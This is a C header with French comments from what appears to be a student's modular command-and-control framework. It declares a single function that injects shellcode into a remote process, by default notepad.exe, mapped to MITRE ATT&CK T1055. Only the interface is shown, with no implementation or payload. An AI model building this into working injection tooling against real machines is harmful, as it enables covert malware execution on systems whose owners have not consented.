/*
 * ============================================================
 *  process_injection.h — Injection de shellcode (T1055)
 *
 *  Technique 4 : Classic Process Injection
 *  MITRE ATT&CK : T1055.001 (Dynamic-link Library Injection)
 *                 T1055.002 (Portable Executable Injection)
 *
 *  Auteur  : El Mazdougui Anass
 *  Date    : Avril 2026
 *  Projet  : Framework C2 Modulaire — PFE INPT 2026
 * ============================================================
 */
#ifndef PROCESS_INJECTION_H
#define PROCESS_INJECTION_H

#include "execution_engine.h"

/*
 * Injecte un shellcode dans un processus distant.
 *
 * Cible par défaut : notepad.exe (spawné si absent).
 * Le nom du processus cible peut être spécifié dans args
 * au format BeaconData : [4B len][nom_processus].
 * Si args est NULL ou vide → cible par défaut.
 *
 * @param sc_bytes  Shellcode à injecter (raw bytes)
 * @param sc_size   Taille du shellcode
 * @param args      Arguments BeaconData (optionnel : nom processus)
 * @param args_len  Taille des arguments
 *
 * @return module_result_t — appeler free_module_result() après usage.
 */
module_result_t inject_execute(
    const unsigned char *sc_bytes, size_t sc_size,
    const unsigned char *args,     size_t args_len
);

#endif /* PROCESS_INJECTION_H */
